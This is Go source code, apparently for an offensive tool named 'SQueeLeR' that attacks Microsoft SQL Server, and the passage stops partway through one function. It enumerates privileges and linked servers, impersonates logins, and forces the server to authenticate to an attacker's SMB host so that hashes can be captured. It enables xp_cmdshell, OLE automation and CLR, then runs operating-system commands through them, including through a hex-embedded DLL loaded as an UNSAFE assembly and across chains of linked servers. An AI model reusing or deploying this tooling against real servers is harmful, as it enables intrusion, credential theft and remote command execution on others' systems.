package main

import (
	"context"
	"database/sql"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/abiosoft/ishell/v2"
	"github.com/akamensky/argparse"
	"github.com/briandowns/spinner"
	_ "github.com/denisenkom/go-mssqldb"
	"github.com/olekukonko/tablewriter"
	"github.com/pkg/errors"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"github.com/rs/zerolog/pkgerrors"
)

type SqlrCommand int

type Sqlr struct {
	db              *sql.DB
	cmd             SqlrCommand
	server          string
	database        string
	username        string
	password        string
	useIntegrated   bool
	impersonate     string
	rpcTarget       string
	query           string
	queryTimeout    time.Duration
	smbServer       string
	smbShare        string
	xpCommand       string
	xpTimeout       time.Duration
	spOaCommand     string
	spOaTimeout     time.Duration
	assemblyCommand string
	assemblyTimeout time.Duration
	enumLinkChain   []string
	execLinkChain   []string
	execLinkCommand string
	execLinkTimeout time.Duration
}

const (
	SQLR_UNUSED SqlrCommand = iota
	SQLR_ENUM_LOCAL
	SQLR_ENABLE_RPC
	SQLR_QUERY
	SQLR_CAPTURE_HASH
	SQLR_XP_CMDSHELL
	SQLR_SP_OA
	SQLR_ASSEMBLY_EXEC
	SQLR_ENUM_LINK
	SQLR_EXEC_LINK
	SQLR_SHELL
)

const (
	queryVersion           = "SELECT @@version"
	queryLogin             = "SELECT SYSTEM_USER"
	queryUsername          = "SELECT USER_NAME()"
	queryPublicRole        = "SELECT IS_SRVROLEMEMBER('public')"
	querySysadminRole      = "SELECT IS_SRVROLEMEMBER('sysadmin')"
	queryListDatabases     = "SELECT name FROM master.dbo.sysdatabases"
	execLinked             = "EXEC sp_linkedservers"
	queryImpersonation     = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
	enableXpCmdShell       = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"
	execXpCmdShellTemplate = `EXEC xp_cmdshell "%s"`
)

const banner = `

_______ _______                   ___          _______ 
|   _   |   _   .--.--.-----.-----|   |  .-----|   _   \
|   1___|.  |   |  |  |  -__|  -__|.  |  |  -__|.  l   /
|____   |.  |   |_____|_____|_____|.  |__|_____|.  _   1
|:  1   |:  1   |                 |:  1   |    |:  |   |
|::.. . |::..   |                 |::.. . |    |::.|:. |
` + "`-------`----|:.|                 `-------'    `--- ---'" + `
			 ` + "`" + `--'                                       
 [[ A product of ACAB Enterprises (@acabenterprises) ]]

`

func NewSqlrFromCmdLine(args []string, parseConnection bool) (*Sqlr, error) {
	parser := argparse.NewParser(args[0], "SQueeLeR MSSQL multipurpose tool")
	parser.ExitOnHelp(false)
	verbose := parser.Flag("v", "verbose", &argparse.Options{
		Help: "Enable debug output",
	})

	var server, database, username, password, impersonate *string
	var useIntegrated *bool
	if parseConnection {
		server = parser.String("s", "server", &argparse.Options{
			Required: true,
			Help:     "SQL server to connect to",
		})
		database = parser.String("d", "database", &argparse.Options{
			Default: "master",
			Help:    "Database to query against",
		})
		username = parser.String("u", "username", &argparse.Options{
			Help: "Username to authenticate with (when not using trusted_connection)",
		})
		password = parser.String("p", "password", &argparse.Options{
			Help: "Password to authenticate with (when not using trusted_connection)",
		})
		useIntegrated = parser.Flag("w", "trusted_connection", &argparse.Options{
			Help: "Use trusted_connected integrated security to authenticate",
		})
		impersonate = parser.String("i", "impersonate", &argparse.Options{
			Help: "Impersonate user before making queries",
		})
	}

	enumCmd := parser.NewCommand("enum", "Enumerate basic info about SQL server")

	enableRpcCmd := parser.NewCommand("enable_rpc", "Enable RPC (required for calling xp_cmdshell on linked server)")
	enableRpcCmd.ExitOnHelp(false)
	rpcTarget := enableRpcCmd.String("t", "target", &argparse.Options{
		Required: true,
		Help:     "Target linked server",
	})

	queryCmd := parser.NewCommand("query", "Run arbitrary query against SQL server")
	queryCmd.ExitOnHelp(false)
	query := queryCmd.String("q", "query", &argparse.Options{
		Required: true,
		Help:     "SQL query",
	})
	queryTimeout := queryCmd.Int("t", "timeout", &argparse.Options{
		Default: 30,
		Help:    "Max number of seconds to wait for query to return",
	})

	captureHashCmd := parser.NewCommand("capture_hash", "Cause SQL server to authenticate against remote SMB share")
	captureHashCmd.ExitOnHelp(false)
	smbServer := captureHashCmd.String("", "ip", &argparse.Options{
		Required: true,
		Help:     "IP address of listening SMB server",
	})
	smbShare := captureHashCmd.String("", "share", &argparse.Options{
		Default: "test",
		Help:    "Name of SMB share",
	})

	xpCmdShellCmd := parser.NewCommand("xp_cmdshell", "Enable xp_cmdshell and run system command")
	xpCmdShellCmd.ExitOnHelp(false)
	xpCommand := xpCmdShellCmd.String("c", "command", &argparse.Options{
		Required: true,
		Help:     "System command to run",
	})
	xpTimeout := xpCmdShellCmd.Int("t", "timeout", &argparse.Options{
		Default: 30,
		Help:    "Max number of seconds to wait for command to complete",
	})

	spOaCmd := parser.NewCommand("sp_oa", "Enable sp_OACreate and run system command")
	spOaCmd.ExitOnHelp(false)
	spOaCommand := spOaCmd.String("c", "command", &argparse.Options{
		Required: true,
		Help:     "System command to run",
	})
	spOaTimeout := spOaCmd.Int("t", "timeout", &argparse.Options{
		Default: 30,
		Help:    "Max number of seconds to wait for command to complete",
	})

	assemblyCmd := parser.NewCommand("assembly", "Run system command via managed code custom assembly")
	assemblyCmd.ExitOnHelp(false)
	assemblyCommand := assemblyCmd.String("c", "command", &argparse.Options{
		Required: true,
		Help:     "System command to run",
	})
	assemblyTimeout := assemblyCmd.Int("t", "timeout", &argparse.Options{
		Default: 30,
		Help:    "Max number of seconds to wait for command to complete",
	})

	enumLinkCmd := parser.NewCommand("enum_link", "Enumerate basic information about a linked SQL server")
	enumLinkCmd.ExitOnHelp(false)
	enumLinkChain := enumLinkCmd.String("l", "links", &argparse.Options{
		Required: true,
		Help:     "Comma-separated chain of links",
	})

	execLinkCmd := parser.NewCommand("link_exec", "Execute system command against a linked SQL server via xp_cmdshell")
	execLinkCmd.ExitOnHelp(false)
	execLinkChain := execLinkCmd.String("l", "links", &argparse.Options{
		Required: true,
		Help:     "Comma-separated chain of links",
	})
	execLinkCommand := execLinkCmd.String("c", "command", &argparse.Options{
		Required: true,
		Help:     "System command to run",
	})
	execLinkTimeout := execLinkCmd.Int("t", "timeout", &argparse.Options{
		Default: 30,
		Help:    "Max number of seconds to wait for command to complete",
	})

	shellCmd := parser.NewCommand("shell", "Interactive SQueeLeR shell")
	shellCmd.ExitOnHelp(false)

	if parseConnection {
		parser.ExitOnHelp(true)
	}
	err := parser.Parse(args)
	if err != nil {
		return nil, errors.New(parser.Usage(err))
	}
	if *verbose {
		zerolog.SetGlobalLevel(zerolog.DebugLevel)
	} else {
		zerolog.SetGlobalLevel(zerolog.InfoLevel)
	}

	sqlr := &Sqlr{}
	if parseConnection {
		sqlr.server = *server
		sqlr.database = *database
		sqlr.username = *username
		sqlr.password = *password
		sqlr.useIntegrated = *useIntegrated
		sqlr.impersonate = *impersonate
	}

	if enumCmd.Happened() {
		sqlr.cmd = SQLR_ENUM_LOCAL
	} else if queryCmd.Happened() {
		sqlr.cmd = SQLR_QUERY
		sqlr.query = *query
		sqlr.queryTimeout = time.Duration(*queryTimeout) * time.Second
	} else if enumLinkCmd.Happened() {
		sqlr.cmd = SQLR_ENUM_LINK
		sqlr.enumLinkChain = strings.Split(*enumLinkChain, ",")
	} else if enableRpcCmd.Happened() {
		sqlr.cmd = SQLR_ENABLE_RPC
		sqlr.rpcTarget = *rpcTarget
	} else if captureHashCmd.Happened() {
		sqlr.cmd = SQLR_CAPTURE_HASH
		sqlr.smbServer = *smbServer
		sqlr.smbShare = *smbShare
	} else if xpCmdShellCmd.Happened() {
		sqlr.cmd = SQLR_XP_CMDSHELL
		sqlr.xpCommand = *xpCommand
		sqlr.xpTimeout = time.Duration(*xpTimeout) * time.Second
	} else if spOaCmd.Happened() {
		sqlr.cmd = SQLR_SP_OA
		sqlr.spOaCommand = *spOaCommand
		sqlr.spOaTimeout = time.Duration(*spOaTimeout) * time.Second
	} else if assemblyCmd.Happened() {
		sqlr.cmd = SQLR_ASSEMBLY_EXEC
		sqlr.assemblyCommand = *assemblyCommand
		sqlr.assemblyTimeout = time.Duration(*assemblyTimeout) * time.Second
	} else if execLinkCmd.Happened() {
		sqlr.cmd = SQLR_EXEC_LINK
		sqlr.execLinkCommand = *execLinkCommand
		sqlr.execLinkChain = strings.Split(*execLinkChain, ",")
		sqlr.execLinkTimeout = time.Duration(*execLinkTimeout) * time.Second
	} else if shellCmd.Happened() {
		sqlr.cmd = SQLR_SHELL
	} else {
		return nil, errors.New("Must specify command")
	}
	return sqlr, nil
}

func main() {
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	zerolog.ErrorStackMarshaler = pkgerrors.MarshalStack
	log.Logger = log.With().Caller().Logger()
	zerolog.SetGlobalLevel(zerolog.InfoLevel)

	fmt.Print(banner)

	sqlr, err := NewSqlrFromCmdLine(os.Args, true)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(0)
	}

	// Authenticate with server
	var connString string
	if sqlr.useIntegrated {
		connString = fmt.Sprintf("server=%s;database=%s;trusted_connection=yes;",
			sqlr.server, sqlr.database)
	} else {
		connString = fmt.Sprintf("server=%s;database=%s;user id=%s;password=%s;",
			sqlr.server, sqlr.database, sqlr.username, sqlr.password)
	}
	log.Debug().Msgf("Using connection string %s\n", connString)

	// Create connection pool
	db, err := sql.Open("sqlserver", connString)
	if err != nil {
		log.Fatal().Err(err).Msg("Error creating connection pool")
	}
	sqlr.db = db

	// Close the database connection pool after program executes
	defer sqlr.db.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := sqlr.db.PingContext(ctx); err != nil {
		log.Fatal().Err(err).Msg("Unable to connect to database")
	}

	if sqlr.impersonate != "" {
		_, err := sqlr.db.ExecContext(ctx, "EXECUTE AS LOGIN = '$1'", sqlr.impersonate)
		if err != nil {
			log.Fatal().Err(err).Msg("Failed to impersonate user")
		}
	}

	switch sqlr.cmd {
	case SQLR_ENUM_LOCAL:
		sqlr.EnumLocal()
	case SQLR_QUERY:
		if err = sqlr.Query(sqlr.query, sqlr.queryTimeout); err != nil {
			log.Fatal().Err(err).Msg("Failed to execute query")
		}
	case SQLR_ENUM_LINK:
		sqlr.EnumLink(sqlr.enumLinkChain)
	case SQLR_ENABLE_RPC:
		if err = sqlr.EnableRpc(sqlr.rpcTarget); err != nil {
			log.Fatal().Err(err).Msg("Failed to enable RPC on target server")
		}
	case SQLR_CAPTURE_HASH:
		if err = sqlr.CaptureHash(sqlr.smbServer, sqlr.smbShare); err != nil {
			log.Fatal().Err(err).Msg("Failed to capture hash")
		}
	case SQLR_XP_CMDSHELL:
		results, err := sqlr.ExecXpCmdShell(sqlr.xpCommand, sqlr.xpTimeout)
		if err != nil {
			log.Fatal().Err(err).Msg("Failed to execute command via xp_cmdshell")
		}
		fmt.Println("Output from command:", results)
	case SQLR_SP_OA:
		if err = sqlr.ExecSpOa(sqlr.spOaCommand, sqlr.spOaTimeout); err != nil {
			log.Fatal().Err(err).Msg("Failed to execute command via sp_OACreate")
		}
	case SQLR_ASSEMBLY_EXEC:
		results, err := sqlr.ExecAssembly(sqlr.assemblyCommand, sqlr.assemblyTimeout)
		if err != nil {
			log.Fatal().Err(err).Msg("Failed to execute command via embedded assembly")
		}
		fmt.Println("Output from command:", results)
	case SQLR_EXEC_LINK:
		results, err := sqlr.ExecLinkCommand(sqlr.execLinkCommand, sqlr.execLinkTimeout, sqlr.execLinkChain)
		if err != nil {
			log.Fatal().Err(err).Msg("Failed to execute command on linked server via xp_cmdshell")
		}
		fmt.Println("Output from command:", results)
	case SQLR_SHELL:
		sqlr.RunShell()
		bye()
	default:
		log.Fatal().Msg("Must specify command")
	}
}

func (sqlr *Sqlr) CheckConnection() {
	if sqlr.server == "" || sqlr.database == "" {
		panic("Must set connection information first")
	}
}

func (sqlr *Sqlr) SwitchDatabase(dbname string) error {
	sqlr.database = dbname
	var connString string
	if sqlr.useIntegrated {
		connString = fmt.Sprintf("server=%s;database=%s;trusted_connection=yes;",
			sqlr.server, sqlr.database)
	} else {
		connString = fmt.Sprintf("server=%s;database=%s;user id=%s;password=%s;",
			sqlr.server, sqlr.database, sqlr.username, sqlr.password)
	}
	log.Debug().Msgf("Using connection string %s\n", connString)
	db, err := sql.Open("sqlserver", connString)
	if err != nil {
		return errors.Wrap(err, "Failed to open connection to database")
	}
	sqlr.db = db
	return nil
}

func (sqlr *Sqlr) RunShell() {
	sqlr.CheckConnection()

	shell := ishell.New()
	shell.SetHomeHistoryPath(".sqlr_history")
	shell.Interrupt(handleInterrupt(shell))
	display := ishell.ProgressDisplayCharSet(spinner.CharSets[6])
	shell.ProgressBar().Display(display)
	shell.SetPrompt(fmt.Sprintf("%s » ", sqlr.server))

	shell.AddCmd(&ishell.Cmd{
		Name: "use",
		Help: "Switch the active database",
		Func: func(c *ishell.Context) {
			if len(c.Args) != 1 {
				c.Println("Must specify database")
				return
			}
			err := sqlr.SwitchDatabase(c.Args[0])
			if err != nil {
				log.Fatal().Err(err).Msg("Error switching database")
			}
			c.Printf("Switched active database to %s\n", sqlr.database)
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "enum",
		Help: "Enumerate basic info about SQL server",
		Func: func(c *ishell.Context) {
			sqlr.EnumLocal()
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "xp_cmdshell",
		Help: "Enable xp_cmdshell and run system command",
		Func: func(c *ishell.Context) {
			if len(c.Args) > 0 {
				cliArgs := make([]string, len(c.Args)+2)
				copy(cliArgs[2:], c.Args)
				cliArgs[1] = "xp_cmdshell"
				s, err := NewSqlrFromCmdLine(cliArgs, false)
				if err != nil {
					c.Println(err.Error())
				} else {
					results, err := sqlr.ExecXpCmdShell(s.xpCommand, s.xpTimeout)
					if err != nil {
						c.Println(err.Error())
					} else {
						c.Println("Output from command:", results)
					}
				}
			} else {
				shell.SetPrompt(fmt.Sprintf("%s {xp_cmdshell}> ", sqlr.server))
				c.Println("Entering xp_cmdshell mode. Enter `back` to return to main menu.")
				for {
					cmd := c.ReadLine()
					switch cmd {
					case "back":
						shell.SetPrompt(fmt.Sprintf("%s (%s) » ", sqlr.server, sqlr.database))
						return
					case "exit":
						bye()
						os.Exit(0)
					default:
						results, err := sqlr.ExecXpCmdShell(cmd, 30*time.Second)
						if err != nil {
							c.Println(err.Error())
						} else {
							c.Println(results)
						}
					}
				}
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "query",
		Help: "Run arbitrary query against SQL server",
		Func: func(c *ishell.Context) {
			if len(c.Args) > 0 {
				cliArgs := make([]string, len(c.Args)+2)
				copy(cliArgs[2:], c.Args)
				cliArgs[1] = "query"
				s, err := NewSqlrFromCmdLine(cliArgs, false)
				if err != nil {
					c.Println(err.Error())
				} else {
					err = sqlr.Query(s.query, s.queryTimeout)
					if err != nil {
						c.Println(err.Error())
					}
				}
			} else {
				shell.SetPrompt(fmt.Sprintf("%s (%s) » ", sqlr.server, sqlr.database))
				c.Println("Entering SQL query mode. Enter `back` to return to main menu.")
				for {
					query := c.ReadLine()
					switch query {
					case "back":
						shell.SetPrompt(fmt.Sprintf("%s (%s) » ", sqlr.server, sqlr.database))
						return
					case "exit":
						bye()
						os.Exit(0)
					default:
						split := strings.Split(strings.TrimSuffix(query, ";"), " ")
						if len(split) == 2 && split[0] == "use" {
							err := sqlr.SwitchDatabase(split[1])
							if err != nil {
								log.Fatal().Err(err).Msg("Failed to switch database")
							}
							c.Printf("Switched active database to %s\n", sqlr.database)
							shell.SetPrompt(fmt.Sprintf("%s (%s) » ", sqlr.server, sqlr.database))
						} else {
							err := sqlr.Query(query, 30*time.Second)
							if err != nil {
								c.Println(err.Error())
							}
						}
					}
				}
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "enum_link",
		Help: "Enumerate basic information about a linked SQL server",
		Func: func(c *ishell.Context) {
			cliArgs := make([]string, len(c.Args)+2)
			copy(cliArgs[2:], c.Args)
			cliArgs[1] = "enum_link"
			s, err := NewSqlrFromCmdLine(cliArgs, false)
			if err != nil {
				c.Println(err.Error())
			} else {
				sqlr.EnumLink(s.enumLinkChain)
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "enable_rpc",
		Help: "Enable RPC (required for calling xp_cmdshell on linked server)",
		Func: func(c *ishell.Context) {
			cliArgs := make([]string, len(c.Args)+2)
			copy(cliArgs[2:], c.Args)
			cliArgs[1] = "enable_rpc"
			s, err := NewSqlrFromCmdLine(cliArgs, false)
			if err != nil {
				c.Println(err.Error())
			} else {
				err = sqlr.EnableRpc(s.rpcTarget)
				if err != nil {
					c.Println(err.Error())
				}
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "capture_hash",
		Help: "Cause SQL server to authenticate against remote SMB share",
		Func: func(c *ishell.Context) {
			cliArgs := make([]string, len(c.Args)+2)
			copy(cliArgs[2:], c.Args)
			cliArgs[1] = "capture_hash"
			s, err := NewSqlrFromCmdLine(cliArgs, false)
			if err != nil {
				c.Println(err.Error())
			} else {
				err = sqlr.CaptureHash(s.smbServer, s.smbShare)
				if err != nil {
					c.Println(err.Error())
				}
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "sp_oa",
		Help: "Enable sp_OACreate and run system command",
		Func: func(c *ishell.Context) {
			cliArgs := make([]string, len(c.Args)+2)
			copy(cliArgs[2:], c.Args)
			cliArgs[1] = "sp_oa"
			s, err := NewSqlrFromCmdLine(cliArgs, false)
			if err != nil {
				c.Println(err.Error())
			} else {
				err = sqlr.ExecSpOa(s.spOaCommand, s.spOaTimeout)
				if err != nil {
					c.Println(err.Error())
				}
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "assembly",
		Help: "Run system command via managed code custom assembly",
		Func: func(c *ishell.Context) {
			cliArgs := make([]string, len(c.Args)+2)
			copy(cliArgs[2:], c.Args)
			cliArgs[1] = "assembly"
			s, err := NewSqlrFromCmdLine(cliArgs, false)
			if err != nil {
				c.Println(err.Error())
			} else {
				results, err := sqlr.ExecAssembly(s.assemblyCommand, s.assemblyTimeout)
				if err != nil {
					c.Println(err.Error())
				} else {
					c.Println("Output from command:", results)
				}
			}
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "link_exec",
		Help: "Execute system command against a linked SQL server via xp_cmdshell",
		Func: func(c *ishell.Context) {
			cliArgs := make([]string, len(c.Args)+2)
			copy(cliArgs[2:], c.Args)
			cliArgs[1] = "link_exec"
			s, err := NewSqlrFromCmdLine(cliArgs, false)
			if err != nil {
				c.Println(err.Error())
			} else {
				results, err := sqlr.ExecLinkCommand(s.execLinkCommand, s.execLinkTimeout, s.execLinkChain)
				if err != nil {
					c.Println(err.Error())
				} else {
					c.Println("Output from command:", results)
				}
			}
		},
	})

	shell.Process("help")
	shell.Run()
}

func bye() {
	fmt.Println("Goodbye.")
}

func handleInterrupt(s *ishell.Shell) func(c *ishell.Context, count int, input string) {
	return func(c *ishell.Context, count int, _ string) {
		if count >= 2 {
			bye()
			os.Exit(1)
		}
		c.Println("Input Ctrl^C one more time to exit")
	}
}

func (sqlr *Sqlr) ExecLinkCommand(cmd string, timeout time.Duration, chain []string) (string, error) {
	sqlr.CheckConnection()
	_, err := sqlr.execLinkStringsResult(enableXpCmdShell, chain, 30*time.Second)
	if err != nil {
		return "", errors.Wrap(err, "Failed to enable xp_cmdshell on linked server")
	}

	results, err := sqlr.execLinkStringsResult(fmt.Sprintf(execXpCmdShellTemplate, cmd), chain, timeout)
	if err != nil {
		return "", errors.Wrap(err, "Failed to execute command on linked server")
	}
	return results[0], nil
}

func (sqlr *Sqlr) ExecAssembly(cmd string, timeout time.Duration) (string, error) {
	sqlr.CheckConnection()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	_, err := sqlr.db.ExecContext(ctx, "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;")
	if err != nil {
		return "", errors.Wrap(err, "Failed to enable CLR")
	}

	_, err = sqlr.db.ExecContext(ctx, "DROP PROCEDURE IF EXISTS [dbo].[cmdExec]; DROP ASSEMBLY IF EXISTS myAssembly; CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C01030081B7698F0000000000000000E00022200B013000000C00000006000000000000E22A00000020000000400000000000100020000000020000040000000000000006000000000000000080000000020000000000000300608500001000001000000000100000100000000000001000000000000000000000008D2A00004F000000004000006803000000000000000000000000000000000000006000000C000000F4290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E80A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000C12A00000000000048000000020005001C210000D8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000FC03000023537472696E67730000000020070000580000002355530078070000100000002347554944000000880700005001000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F00000001000000010000000300000000006C02010000000000060096011B03060003021B030600B400E9020F003B0300000600DC007F02060079017F0206005A017F020600EA017F020600B6017F020600CF017F02060009017F020600C800FC020600A600FC0206003D017F0206002401350206008D0378020A00F300C8020A004F024A030E007003E9020A006A00C8020E009F02E9020600650278020A002000C8020A00960014000A00DF03C8020A008E00C8020600B0020A000600BD020A000000000001000000000001000100010010005F03000041000100010050200000000096003D00620001001121000000008618E30206000200000001005E000900E30201001100E30206001900E3020A002900E30210003100E30210003900E30210004100E30210004900E30210005100E30210005900E30210006100E30215006900E30210007100E30210007900E30210008900E30206009900E3020600990091022100A90078001000B10086032600A90078031000A90021021500A900C40315009900AB032C00B900E3023000A100E3023800C90085003F00D100A00344009900B1034A00E10045004F00810059024F00A10062025300D100EA034400D1004F0006009900940306009900A00006008100E302060020007B0049012E000B0068002E00130071002E001B0090002E00230099002E002B00A6002E003300A6002E003B00A6002E00430099002E004B00AC002E005300A6002E005B00A6002E006300C4002E006B00EE002E007300FB001A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007802000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C69620053514C4578656300636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E670053514C457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000003DC5D0FBAB0CEB45BA057E36639595FB00042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000C01000753514C45786563000005010000000017010012436F7079726967687420C2A920203230323200002901002436363163623136352D636538342D343266392D383934382D32313232383564343239666600000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000005788159D0000000002000000610000002C2A00002C0C00000000000000000000000000001000000000000000000000000000000052534453667928306CD7DC49BCEF5891722C36C8010000005C5C3139322E3136382E34392E38385C76697375616C73747564696F5C436F6E736F6C65417070315C53514C457865635C6F626A5C52656C656173655C53514C457865632E70646200B52A00000000000000000000CF2A0000002000000000000000000000000000000000000000000000C12A0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E0000000000530051004C0045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D0065000000530051004C0045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000530051004C0045007800650063002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D00650000000000530051004C0045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000E43A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;")
	if err != nil {
		return "", errors.Wrap(err, "Failed to create assembly")
	}

	_, err = sqlr.db.ExecContext(ctx, "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")
	if err != nil {
		return "", errors.Wrap(err, "Failed to create procedure")
	}

	cmdCtx, cmdCancel := context.WithTimeout(context.Background(), timeout)
	defer cmdCancel()
	var results string
	err = sqlr.db.QueryRowContext(cmdCtx, fmt.Sprintf(`EXEC cmdExec '%s';`, cmd)).Scan(&results)
	if err != nil {
		return "", err
	}
	return results, nil
}

func (sqlr *Sqlr) ExecSpOa(cmd string, timeout time.Duration) error {
	sqlr.CheckConnection()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	_, err := sqlr.db.ExecContext(ctx, "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;")
	if err != nil {
		return errors.Wrap(err, "Failed to enable Ola Automation Procedures")
	}

